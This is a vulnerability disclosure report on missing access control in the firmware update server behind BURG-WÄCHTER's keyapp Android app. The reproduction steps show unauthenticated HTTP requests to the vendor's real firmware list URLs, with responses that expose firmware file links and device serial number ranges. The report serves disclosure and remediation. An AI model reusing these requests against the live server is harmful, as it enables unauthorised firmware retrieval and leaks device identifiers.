# Vulnerability Report - de.burgwachter.keyapp.app- Incorrect Access Control

**Product:** `de.burgwachter.keyapp.app` 

**Vendor:** [BURG-WÄCHTER KG](https://burg.biz/)

**Version:** 4.5.0

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `de.burgwachter.keyapp.app` , developed by **BURG-WÄCHTER KG**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage** and **Device SN leakage**.

## Reproduction Steps

1. The `f27435a` Field value in the `onPostExecute` method  and `Downloader`'s parameter value in the `m4703c` method provide the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003120709987](https://s2.loli.net/2024/10/03/kBQew2aYrOPqXDZ.png)

   ![image-20241003120826571](https://s2.loli.net/2024/10/03/sUL4S6DJaCIhkfH.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://transfer.burg-waechter.net/firmware/SecuEntryFirmwareList.xml HTTP/2
   User-Agent: Fiddler Everywhere
   Host: transfer.burg-waechter.net
   
   
   ```

   ```http
   GET https://transfer.burg-waechter.net/firmware/sE_CYL_FwList_EN.xml HTTP/2
   User-Agent: Fiddler Everywhere
   Host: transfer.burg-waechter.net
   
   
   ```

   > Response:

   ```http
   HTTP/2 200
   last-modified: Tue, 01 Oct 2024 12:57:23 GMT
   etag: "4a6b-62369dccf52e3"
   accept-ranges: bytes
   content-length: 19051
   vary: Accept-Encoding,User-Agent
   content-type: application/xml
   date: Thu, 03 Oct 2024 04:10:40 GMT
   server: Apache
   
   <?xml version="1.1" encoding="utf-8"?>
   <FirmwareUpdateInfo CreationTime="22-06-2022 09:51:34">
     <Unit type="secuENTRY 5700 Basic">  	
       <module type="secuENTRY Profile cylinder 5700 Basic"> 
       <Part type="Profile cylinder V3.0">
          <Name>WARNING! from Version 1.7 / Bridge compatible</Name>
          <Version>3.0</Version>
          <FileLink>https://transfer.burg-waechter.net/firmware/secuENTRY-5700std/EPC5700-V30-C0C80FCA624AE91418C50599CD9CD7F3.bwf</FileLink>
       </Part>                                    
      </module>                 
     </Unit>  
     ......
    
   ```

   ```http
   HTTP/2 200
   last-modified: Wed, 17 Jul 2024 10:59:13 GMT
   etag: "1317-61d6f5a435bb8"
   accept-ranges: bytes
   content-length: 4887
   vary: Accept-Encoding,User-Agent
   content-type: application/xml
   date: Thu, 03 Oct 2024 04:11:02 GMT
   server: Apache
   
   <?xml version="1.0" encoding="utf-8"?>
   <FirmwareUpdateInfo CreationTime="05-01-2022 16:00:01">
   <SerialNumber SnStart="275218432" SnEnd="275382271">
   	<Version SoftwareVersion="2.6">
   		<module type="secuENTRY easy Profile cylinder CYL 7600 "> 
   			<Part type="secuENTRY CYL 7600 V2.6">
   				  <Name>WARNING! With the new software version, only Burg-Wachter RFID tags are now supported. RFID-Tags from other manufacturer will be blocked. </Name>
   				  <FileLink>https://transfer.burg-waechter.net/firmware/secuENTRY_CYL_FW/EPC7600-V26-C206E7EFF571C99C6FC7E4CB4B459666.bwf</FileLink>
   		  </Part>
   		</module>
   	</Version>
   </SerialNumber> 
     ......
   ```

   

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003121346484](https://s2.loli.net/2024/10/03/8HJgzDSwFoB2E7M.png)
   
   In total, we successfully downloaded **35 firmware** by exploiting the vulnerability. Meanwhile, the information in the Response leaks the **SN** of the devices.


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.